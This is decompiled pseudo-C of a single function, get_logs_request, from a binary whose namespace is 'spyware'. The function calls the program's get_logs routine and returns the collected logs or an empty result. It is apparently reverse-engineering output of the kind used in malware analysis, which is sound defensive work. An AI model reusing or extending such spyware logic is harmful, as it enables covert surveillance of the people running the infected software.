long long spyware::actions::log_actions::get_logs_request(struct_0 *a0)
{
    void* v0;  // [bp-0x78], Other Possible Types: unsigned long long
    unsigned long long v1;  // [bp-0x70]
    void* v2;  // [bp-0x68], Other Possible Types: unsigned long long
    unsigned long long v3;  // [bp-0x60]
    unsigned long long v4;  // [bp-0x58]
    unsigned long long v5;  // [bp-0x50]
    unsigned long long v6;  // [bp-0x48]
    unsigned long long v7;  // [bp-0x40]
    uint128_t v8;  // [bp-0x38]
    int v9;  // [bp-0x20], Other Possible Types: char
    char v10;  // [bp-0x10]

    if (::0x4558d0::core::sync::atomic::atomic_load(&_ZN3log20MAX_LOG_LEVEL_FILTER17h115edbfc95f53bc0E, 0) >= 4)
    {
        v5 = &g_4b99d8;
        v6 = 1;
        v7 = 8;
        v8 = 0;
        v0 = "spyware::actions::log_actions";
        v1 = 29;
        v2 = "spyware::actions::log_actions";
        v3 = 29;
        v4 = log::__private_api::loc(&g_4b99f8);
        log::__private_api::log(&v5, 4, &v0);
    }
    spyware::logging::core::get_logs(&v9);
    if (!((char)(((0 ^ *((long long *)&v9)) & (0 ^ -(*((long long *)&v9)))) >> 63)))
    {
        a0->field_10 = *((long long *)&v10);
        *((void*)&a0->field_0) = v9;
        *((unsigned long long *)&a0->field_18) = 0x8000000000000000;
        return a0;
    }
    if (::0x4558d0::core::sync::atomic::atomic_load(&_ZN3log20MAX_LOG_LEVEL_FILTER17h115edbfc95f53bc0E, 0))
    {
        v5 = &g_4b99e8;
        v6 = 1;
        v7 = 8;
        v8 = 0;
        v0 = "spyware::actions::log_actions";
        v1 = 29;
        v2 = "spyware::actions::log_actions";
        v3 = 29;
        v4 = log::__private_api::loc(&g_4b9a10);
        log::__private_api::log(&v5, 1, &v0);
    }
    v0 = 0;
    v1 = 8;
    v2 = 0;
    v5.to_vec();
    a0->field_28 = v7;
    *((int128_t *)&a0->field_18) = *((int128_t *)&v5);
    a0->field_10 = 0;
    a0->field_0 = *((int128_t *)&v0);
    a0->field_30 = 1;
    return a0;
}
